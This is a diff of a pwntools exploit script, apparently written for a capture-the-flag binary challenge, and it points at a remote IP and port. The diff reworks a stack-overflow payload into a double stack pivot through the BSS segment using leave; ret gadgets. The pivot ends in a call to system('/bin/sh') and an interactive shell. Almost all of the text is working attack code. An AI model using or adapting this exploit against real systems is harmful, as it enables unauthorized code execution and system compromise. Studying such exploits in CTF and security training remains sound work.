@@ -13,8 +13,8 @@ context.binary = exe
 host = "83.136.252.214"
 port = 56736
 
-host = "localhost"
-port = 1337
+# host = "localhost"
+# port = 1337
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -62,30 +62,38 @@ c
 
 io = start()
 
-# # --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
+# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
 
 ret = 0x401184
-leave_ret = 0x401183
+leave_ret = 0x401183 #: leave ; ret
 padding_len = 0x20
+middle_of_bss = 0x404800
+main_skip_build_stack_frame = exe.sym['main'] + 12
+mov_rdi_rax_call_system = exe.sym['main'] + 19
 
-cmd_padding = b"/bin/sh\x00".ljust(padding_len, b"a")
 
+# stack pivot 1: rbp = middle_of_bss
 payload = flat(
-    cmd_padding,        # padding start with cmd
-    exe.bss()+0x800,    # rbp
-    0x401169,       # ret
+    'a'*padding_len,
+    middle_of_bss,                  # rbp
+    main_skip_build_stack_frame     # ret addr
 )
 
 sla(b">> ", payload)
 
-# sla(b">> ", b"a"*padding_len + p64(0x404800) + p64(exe.sym['main'] + 27))
-# # => base = 0x404800, sp = large
+# double stack pivot
+# stack pivot 2 (function leave_ret):   rbp = middle_of_bss + 0x500
+# stack pivot 3 (ret2leaveret):         rsp = rbp = middle_of_bss + 0x500  
+cmd = b"/bin/sh\x00".ljust(padding_len, b'a')
+payload = flat(
+    cmd,
+    middle_of_bss + 0x500,      # rbp
+    leave_ret,                  # ret addr
+    b"a"*(0xf8+0x400),          # padding to after stack pivot 3 return address
+    mov_rdi_rax_call_system
+)
 
-# sleep(3)
-# sl(cmd + p64(0x404900+0x400) + p64(leave_ret) + b"a"*(0xf8+0x400) + p64(exe.sym['main'] + 19))
-# # main leave ret => base = 0x404a00, sp = 0x404800
-# # mali leave ret => base = 0x404a00, sp = 0x404a00
+sla(b">> ", payload)
 
 io.interactive()
-
 
